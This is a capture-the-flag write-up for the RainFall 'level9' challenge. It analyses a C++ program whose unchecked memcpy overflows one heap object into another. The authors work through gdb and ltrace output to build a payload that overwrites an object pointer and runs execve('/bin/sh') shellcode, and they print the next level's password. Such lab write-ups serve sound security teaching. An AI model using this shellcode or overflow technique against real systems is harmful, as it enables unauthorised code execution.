# level9

### First analysis

This level is pretty different from the other ones, since the decompiled version of this binary is a cpp file and not a c file like every single level since the beginning of RainFall. We are the last mandatory exercice so that's probably why. This is the adapted version that you can find in source.cpp of the binary:

```cpp
class N {
    private:
        int     value;
        char    annotation[108];
        
    public:
        N(int nbr): value(nbr) {}

        int operator+ (N &n) {
            return this->value += n.value;
        }

        int operator- (N &n) {
            return this->value -= n.value;
        }

        void setAnnotation(char *annotation) {
            memcpy(this->annotation, annotation, strlen(annotation));
        }
};

int main(int ac, char **av) {
    if (ac < 2)
        exit(1);
    
    N *a = new N(5);
    N *b = new N(6);

    a->setAnnotation(av[1]);

    return (*a + *b);
}
```

So we have a class N that has a value and an annotation field. A few functions are present, minus and plus operator, the constructor, and finally a setAnnotation that use memcpy to fill the annotation field. The main functions simply create two instances of N in the heap (new uses malloc), and set the annotation of the first one to av[1]. We can imagine that an overflow is possible by entering more than 108 chars into av[1] that will overflow the 108 buffer size of annotation. So this is what we tried first and we bserved that in gdb:

```sh
(gdb) run $(python -c "print 'A' * 1000")
Starting program: /home/user/level9/level9 $(python -c "print 'A' * 1000")
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x41414141	1094795585
edx            0x804a3f4	134521844
ebx            0x804a078	134520952
esp            0xbffff320	0xbffff320
ebp            0xbffff348	0xbffff348
esi            0x0	0
edi            0x0	0
eip            0x8048682	0x8048682 <main+142>
eflags         0x210287	[ CF PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

So we entered a huge buffer to see if variable were changed. Whereas the return value of the segfault didn't change, we observed that eax and edx were modified, so we indeed were writing in some part of the memory that was not intended by the program. We also used ltrace to retrieve the address of the memcpy used in setAnnotation and got this:

```sh
level9@RainFall:~$ ltrace ./level9 $(python -c "print 'A' * 1000")
__libc_start_main(0x80485f4, 2, 0xbffff404, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                     = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                  = 0
_Znwj(108, 0xbffff404, 0xbffff410, 0xb7d79e55, 0xb7fed280)                                             = 0x804a008
_Znwj(108, 5, 0xbffff410, 0xb7d79e55, 0xb7fed280)                                                      = 0x804a078
strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                          = 1000
memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 1000)                                        = 0x0804a00c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

We can see that annotation seems to be stored in the heap at the address 0x0804a00c. So we tried to see what happened if we set a payload with 108 chars and 4 more chars of the address of annotation with the idea in mind that we could maybe inject a shellcode to solve this exercice:

```sh
(gdb) run $(python -c "print 'A' * 108 + '\x0c\xa0\x04\x08'")
Starting program: /home/user/level9/level9 $(python -c "print 'A' * 108 + '\x0c\xa0\x04\x08'")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

This result is very interesting because apparently we managed to redirect the execution to the address 0x41414141. 41 being the hex value of A, we knew something happened, the theory was that by adding the address at the end, it would redirect the program at the beginning of the buffer of annotation, if it is the case then we might be able to execute this shellcode we had in mind. We then checked to be sure if this theory was true by setting only 4 B chars at the beginning of the buffer, then a bunch of A. If the address of segfault is 0x42424242, then it probably means that we can inject a shellcode and hopefully make the program interprets it:

```sh
(gdb) run $(python -c "print 'BBBB' + 'A' * 104 + '\x0c\xa0\x04\x08'")
Starting program: /home/user/level9/level9 $(python -c "print 'BBBB' + 'A' * 104 + '\x0c\xa0\x04\x08'")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

And for sure it is ! Sp we took our sheelcode we used in level2, a 21 chars long shellcode, and tried this payload:

```sh
(gdb) run $(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 87 + '\x0c\xa0\x04\x08'")
Starting program: /home/user/level9/level9 $(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 87 + '\x0c\xa0\x04\x08'")

Program received signal SIGSEGV, Segmentation fault.
0x99580b6a in ?? ()
```

Something weird and unexpected happens here. The address of segfault is the beginning of our shellcode... which means somehow this place of memory is interpreted as an address and not the shellcode. So we tried to replace this space of memory too with the address of the beginning of the buffer + 4 and this is what happened:

```sh
(gdb) run $(python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * 83 + '\x0c\xa0\x04\x08'")

Starting program: /home/user/level9/level9 $(python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * 83 + '\x0c\xa0\x04\x08'")
process 6037 is executing new program: /bin/dash
$ whoami
level9
```

What happens is that we redirect the end of the buffer to the beginning of the buffer, we then redirect the beginning of the buffer to buffer + 4. And it works ! We can now retrieve our flag:

```sh
level9@RainFall:~$ ./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * 83 + '\x0c\xa0\x04\x08'")
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
